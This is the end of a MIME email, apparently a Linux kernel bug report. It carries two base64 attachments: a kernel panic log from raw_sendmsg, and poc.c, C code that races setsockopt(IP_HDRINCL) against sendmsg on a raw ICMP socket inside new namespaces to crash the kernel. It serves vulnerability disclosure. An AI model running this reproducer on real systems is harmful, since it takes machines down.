ICAgMi43NjQxOTFdIFJJUDogMDAxMDpjc3VtX2FuZF9jb3B5X2Zyb21faXRl
cl9mdWxsKzB4MC8weDNkMApbICAgIDIuNzY0NDk3XSBSU1A6IDAwMTg6ZmZm
ZmM5MDAwNWFkN2FhMCBFRkxBR1M6IDAwMDEwMjAzClsgICAgMi43NjQ3ODBd
IFJBWDogMDAwMDAwMDAwMDAwMDAwMCBSQlg6IGZmZmY4ODAyMzJjNjEwMDAg
UkNYOiAxMTExMTExMTAxMDAxMTIxClsgICAgMi43NjUxNjNdIFJEWDogZmZm
ZmM5MDAwNWFkN2FhYyBSU0k6IDAwMDAwMDAwMDAwMDY0MDAgUkRJOiBmZmZm
ODgwMjMwZmIwMDI0ClsgICAgMi43NjU1NDVdIFJCUDogMDAwMDAwMDAwMDAw
MDAwMCBSMDg6IDAwMDAwMDAwMDAwMDAwMDAgUjA5OiBmZmZmODgwMjMyYzYx
MDAwClsgICAgMi43NjU5MzBdIFIxMDogZmZmZjg4MDIzMGZiMDAyNCBSMTE6
IDAwMDAwMDAwMDAwMDAwMDMgUjEyOiAwMDAwMDAwMDAwMDA2NDAwClsgICAg
Mi43NjYzMTFdIFIxMzogMDAwMDAwMDAwMDAwMDAwMCBSMTQ6IGZmZmY4ODAy
MzM4OWExNDggUjE1OiAwMDAwMDAwMDAwMDA2NDAwClsgICAgMi43NjY2OThd
IEZTOiAgMDAwMDdmNGRhNGM2ZTcwMCgwMDAwKSBHUzpmZmZmODgwMjNmZDgw
MDAwKDAwMDApIGtubEdTOjAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc2NzEz
OF0gQ1M6ICAwMDEwIERTOiAwMDAwIEVTOiAwMDAwIENSMDogMDAwMDAwMDA4
MDA1MDAzMwpbICAgIDIuNzY3NDQ4XSBDUjI6IDAwMDAwMDAwMDIwM2EwNDAg
Q1IzOiAwMDAwMDAwMjM1ZWIyMDAwIENSNDogMDAwMDAwMDAwMDAwMDZlMApb
ICAgIDIuNzY3ODMxXSBEUjA6IDAwMDAwMDAwMDAwMDAwMDAgRFIxOiAwMDAw
MDAwMDAwMDAwMDAwIERSMjogMDAwMDAwMDAwMDAwMDAwMApbICAgIDIuNzY4
MjEzXSBEUjM6IDAwMDAwMDAwMDAwMDAwMDAgRFI2OiAwMDAwMDAwMGZmZmUw
ZmYwIERSNzogMDAwMDAwMDAwMDAwMDQwMApbICAgIDIuNzY4NjAwXSBDYWxs
IFRyYWNlOgpbICAgIDIuNzY4NzQxXSAgaXBfZ2VuZXJpY19nZXRmcmFnKzB4
M2QvMHg5MApbICAgIDIuNzY4OTYwXSAgX19pcF9hcHBlbmRfZGF0YS5pc3Jh
LjQ4KzB4NjlmLzB4ODUwClsgICAgMi43NjkyMzJdICA/IHJhd19kZXN0cm95
KzB4MjAvMHgyMApbICAgIDIuNzY5NDM0XSAgPyByYXdfZGVzdHJveSsweDIw
LzB4MjAKWyAgICAyLjc2OTYyNV0gIGlwX2FwcGVuZF9kYXRhLnBhcnQuNTAr
MHg2Ny8weGMwClsgICAgMi43Njk4NTddICByYXdfc2VuZG1zZysweDcxMC8w
eDllMApbICAgIDIuNzcwMDY4XSAgPyBfY29weV9mcm9tX3VzZXIrMHgzMS8w
eDYwClsgICAgMi43NzAyODJdICA/IGltcG9ydF9pb3ZlYysweDI3LzB4YzAK
WyAgICAyLjc3MDQ5MF0gIHNvY2tfc2VuZG1zZysweDJiLzB4NDAKWyAgICAy
Ljc3MDY3OF0gIF9fX3N5c19zZW5kbXNnKzB4MjllLzB4MmIwClsgICAgMi43
NzA4ODRdICA/IHJlbGVhc2Vfc29jaysweDdhLzB4OTAKWyAgICAyLjc3MTA5
OV0gID8gZG9faXBfc2V0c29ja29wdC5pc3JhLjEyKzB4MWIzLzB4ZTAwClsg
ICAgMi43NzEzNjRdICA/IF9fc3lzX3NlbmRtc2crMHgzYy8weDcwClsgICAg
Mi43NzE1NzVdICBfX3N5c19zZW5kbXNnKzB4M2MvMHg3MApbICAgIDIuNzcx
NzY3XSAgZW50cnlfU1lTQ0FMTF82NF9mYXN0cGF0aCsweDEzLzB4NmMKWyAg
ICAyLjc3MjAxMl0gUklQOiAwMDMzOjB4NDA1MmYxClsgICAgMi43NzIxOThd
IFJTUDogMDAyYjowMDAwN2Y0ZGE0YzZkZGEwIEVGTEFHUzogMDAwMDAyOTMg
T1JJR19SQVg6IDAwMDAwMDAwMDAwMDAwMmUKWyAgICAyLjc3MjYxMV0gUkFY
OiBmZmZmZmZmZmZmZmZmZmRhIFJCWDogMDAwMDdmNGRhNGM2ZTcwMCBSQ1g6
IDAwMDAwMDAwMDA0MDUyZjEKWyAgICAyLjc3Mjk4M10gUkRYOiAwMDAwMDAw
MDAwMDAwMDAwIFJTSTogMDAwMDAwMDAwMTkyMWJlMCBSREk6IDAwMDAwMDAw
MDAwMDAwMDMKWyAgICAyLjc3MzM4Ml0gUkJQOiAwMDAwN2ZmZDBmOWQzZmYw
IFIwODogMDAwMDAwMDAwMDAwMDAwNCBSMDk6IDAwMDA3ZjRkYTRjNmU3MDAK
WyAgICAyLjc3Mzc0OF0gUjEwOiAwMDAwN2Y0ZGE0YzZkZGMwIFIxMTogMDAw
MDAwMDAwMDAwMDI5MyBSMTI6IDAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc3
NDEzOV0gUjEzOiAwMDAwN2ZmZDBmOWQzZmVmIFIxNDogMDAwMDdmNGRhNGM2
ZTljMCBSMTU6IDAwMDAwMDAwMDAwMDAwMDAKWyAgICAyLjc3NDUzMV0gQ29k
ZTogZjcgNDggMjkgZWYgZTggZjIgYTcgNWQgMDAgNDggMjkgZWIgMGYgODQg
MjkgZmUgZmYgZmYgZWIgYzkgNGMgODkgZWIgMzEgYzAgZTkgMGMgZmUgZmYg
ZmYgNGMgODkgZWIgZWIgYmEgMzEgYzAgZTkgMDAgZmUgZmYgZmYgOTAgPDhi
PiAwMSBhOCAwOCAwZiA4NSA4MCAwMSAwMCAwMCA0MSA1NyA0MSA1NiA0OSA4
OSBmNyA0MSA1NSA0MSA1NCAKWyAgICAyLjc3NTU2N10gUklQOiBjc3VtX2Fu
ZF9jb3B5X2Zyb21faXRlcl9mdWxsKzB4MC8weDNkMCBSU1A6IGZmZmZjOTAw
MDVhZDdhYTAKWyAgICAyLjc3NTk2N10gLS0tWyBlbmQgdHJhY2UgZmY0ZDU5
NTY0ZmVkMjEzYyBdLS0tClsgICAgMi43NzYyMzldIEtlcm5lbCBwYW5pYyAt
IG5vdCBzeW5jaW5nOiBGYXRhbCBleGNlcHRpb24KWyAgICAyLjc3NjcxMV0g
S2VybmVsIE9mZnNldDogZGlzYWJsZWQKWyAgICAyLjc3NjkwM10gUmVib290
aW5nIGluIDEgc2Vjb25kcy4uCg==

--001a11482b1cb7a18005606a34df
Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_jb8lswlv1

I2RlZmluZSBfR05VX1NPVVJDRQojaW5jbHVkZSA8c3RkaW8uaD4KI2luY2x1
ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1
bmlzdGQuaD4KI2luY2x1ZGUgPHNjaGVkLmg+CiNpbmNsdWRlIDxwdGhyZWFk
Lmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlw
ZXMuaD4KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4KI2luY2x1ZGUgPHBvbGwu
aD4KCiNkZWZpbmUgQ0hLRVJSKGNvbmQsbXNnKSAgICBpZigoY29uZCkpIHsJ
XAoJCXBlcnJvcigobXNnKSk7CQkJXAoJfQojZGVmaW5lIFBTSVpFCQkxMDAK
I2RlZmluZSBUSURTSVpFCQkxMDAwMAoKcHRocmVhZF90IHRpZDFbVElEU0la
RV07CnB0aHJlYWRfdCB0aWQyW1RJRFNJWkVdOwoKCmludCB2YWwwID0gMDsK
c3RydWN0IG1zZ2hkciAqbXNnID0gTlVMTDsKc3RydWN0IHNvY2thZGRyX2lu
IHNpbj0gey5zaW5fcG9ydCA9IDB9OwpzdHJ1Y3QgaW92ZWMgaW92WzI1Nl07
CmludCBpOwp1bnNpZ25lZCBjaGFyIGJ1ZltQU0laRV07CmNoYXIgcGF5bG9h
ZFsyMDQ4XTsKaW50IGZkc29jazsKdm9pZCBjcmVhdGVfbnModm9pZCkKewoJ
aWYodW5zaGFyZShDTE9ORV9ORVdVU0VSKSAhPSAwKSB7CgkJcGVycm9yKCJ1
bnNoYXJlKENMT05FX05FV1VTRVIpIik7CgkJZXhpdCgxKTsKCX0KCWlmKHVu
c2hhcmUoQ0xPTkVfTkVXTkVUKSAhPSAwKSB7CgkJcGVycm9yKCJ1bnNoYXJl
ZChDTE9ORV9ORVdVU0VSKSIpOwoJCWV4aXQoMik7Cgl9Cn0KCnZvaWQgKmRv
X3NldHNvY2tvcHRfaGRyaW5jbCh2b2lkICphcmcpCnsKCWludCBlcnIsdmFs
OwoJdmFsID0gKihpbnQqKWFyZzsKICAgCgllcnIgPSBzZXRzb2Nrb3B0KGZk
c29jayxTT0xfSVAsSVBfSERSSU5DTCwmdmFsLDQpOyAKCUNIS0VSUihlcnIs
InNldHNvY2tvcHRfaW50Iik7CglyZXR1cm4gTlVMTDsKfQoKdm9pZCBkb19w
b2xsKHZvaWQpCnsKCXBvbGwoKHN0cnVjdCBwb2xsZmQqKXBheWxvYWQsMjU2
LDApOwp9CgoKaW50IGNyZWF0ZV9zb2NrZXQodm9pZCkKewoJaW50IGZkID0g
c29ja2V0KFBGX0lORVQsIFNPQ0tfUkFXLCBJUFBST1RPX0lDTVApOwoJQ0hL
RVJSKGZkIDwgMCwic29ja2V0Iik7CglyZXR1cm4gZmQ7Cn0KCnN0cnVjdCBt
c2doZHIgKnByZXBhcmVfc2VuZG1zZyh2b2lkKQp7CglzdHJ1Y3QgbXNnaGRy
ICptc2c7CgoJaW50IG9mZiA9IDE1NjsKCQoJbWVtc2V0KGJ1ZiwweGNjLFBT
SVpFKTsKCW1lbXNldChwYXlsb2FkLDB4MDAsMjA0OCk7CgltZW1zZXQocGF5
bG9hZCtvZmYgLCAweDExLDgpOwoKCWZvcihpPTA7aTwyNTY7aSsrKSB7CgkJ
aW92W2ldLmlvdl9iYXNlID0gYnVmOwoJCWlvdltpXS5pb3ZfbGVuID0gUFNJ
WkU7Cgl9CgoJbXNnID0gbWFsbG9jKHNpemVvZihzdHJ1Y3QgbXNnaGRyKSk7
CglpZighbXNnKSB7CgkJcGVycm9yKCJtYWxsb2MiKTsKCQlleGl0KC0xKTsK
CX0KCW1lbXNldChtc2csMCxzaXplb2Yoc3RydWN0IG1zZ2hkcikpOwoJbWVt
c2V0KCZzaW4sMCxzaXplb2Yoc2luKSk7CgkKCW1zZy0+bXNnX25hbWUgPSAm
c2luOwoJbXNnLT5tc2dfbmFtZWxlbiA9IHNpemVvZihzaW4pOwoJbXNnLT5t
c2dfaW92ID0gaW92OwoJbXNnLT5tc2dfaW92bGVuID0gMjU2OwoJbXNnLT5t
c2dfY29udHJvbCA9IE5VTEw7Cgltc2ctPm1zZ19jb250cm9sbGVuID0gMDsK
CW1zZy0+bXNnX2ZsYWdzID0gMDsKCXJldHVybiBtc2c7Cn0Kdm9pZCAqZG9f
c2VuZG1zZ19mb3JfcmFjZSh2b2lkICphcmcpCnsKCWludCB2YWwgPSAxOwoJ
aW50IGZkID0gKihpbnQqKWFyZzsKCglzZXRzb2Nrb3B0KGZkLFNPTF9JUCxJ
UF9IRFJJTkNMLCZ2YWwsNCk7Cglkb19wb2xsKCk7CglzZW5kbXNnKGZkLG1z
ZywwKTsKCQoJcmV0dXJuIE5VTEw7Cn0KCgoKdm9pZCByYWN5KHZvaWQpCnsK
CWludCBpOwoJCglmb3IoaT0wO2k8VElEU0laRTtpKyspIHsKCQlwdGhyZWFk
X2NyZWF0ZSgmdGlkMVtpXSxOVUxMLGRvX3NldHNvY2tvcHRfaGRyaW5jbCwo
dm9pZCopJnZhbDApOwoJCXB0aHJlYWRfY3JlYXRlKCZ0aWQyW2ldLE5VTEws
ZG9fc2VuZG1zZ19mb3JfcmFjZSwodm9pZCopJmZkc29jayk7CgkKCX0KCWZv
cihpPTA7aTxUSURTSVpFO2krKykgewoJCXB0aHJlYWRfam9pbih0aWQxW2ld
LE5VTEwpOwoJCXB0aHJlYWRfam9pbih0aWQyW2ldLE5VTEwpOwoJfQoKfQpp
bnQgbWFpbihpbnQgYXJnYyxjaGFyICoqYXJndikKewoJY3JlYXRlX25zKCk7
CglmZHNvY2sgPSBjcmVhdGVfc29ja2V0KCk7Cgltc2cgPSBwcmVwYXJlX3Nl
bmRtc2coKTsKCQoJcmFjeSgpOwoJCglyZXR1cm4gMDsKCQp9Cg==

--001a11482b1cb7a18005606a34df--
